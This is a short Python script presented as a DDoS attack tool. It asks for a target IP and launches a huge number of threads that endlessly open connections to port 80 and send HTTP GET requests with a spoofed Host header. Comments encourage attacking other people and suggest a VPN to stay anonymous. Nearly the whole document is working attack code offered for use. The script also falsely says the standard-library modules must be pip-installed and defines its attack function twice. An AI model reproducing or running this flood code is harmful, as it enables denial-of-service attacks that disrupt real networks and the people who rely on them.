#This DDoS attack can make a person's network extremely slow.
#You can run the script first with your ip to see how slow your Internet becomes.

#First pip install socket and threading
import threading
import socket


print('''\n
██████╗ ██████╗  █████╗  ██████╗   █████╗ ████████╗████████╗ █████╗  █████╗ ██╗  ██╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝  ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║ ██╔╝
██║  ██║██║  ██║██║  ██║╚█████╗   ███████║   ██║      ██║   ███████║██║  ╚═╝█████═╝ 
██║  ██║██║  ██║██║  ██║ ╚═══██╗  ██╔══██║   ██║      ██║   ██╔══██║██║  ██╗██╔═██╗ 
██████╔╝██████╔╝╚█████╔╝██████╔╝  ██║  ██║   ██║      ██║   ██║██║ ╚█████╔╝██║ ╚██╗
╚═════╝ ╚═════╝  ╚════╝ ╚═════╝   ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝╚════╝ ╚═╝  ╚═╝\n''')

target = input('Eɴᴛᴇʀ ʏᴏᴜʀ ᴛᴀʀɢᴇᴛ ɪᴘ: ')
my_fake_ip = '142.29.20.39' #This ip is actually unnecessary.  If you want to stay anonymous, you must use a "VPN".
port = 80

connection = 0

#A attack() function 
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + my_fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()


 #To start attacking someone
for i in range(999999999):
    thread = threading.Thread(target=attack)
    thread.start()

attacking_number = 0


#An infinitive loop for attacking someone 
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + my_fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        global attacking_number
        attacking_number += 1
        print(attacking_number)

        s.close()
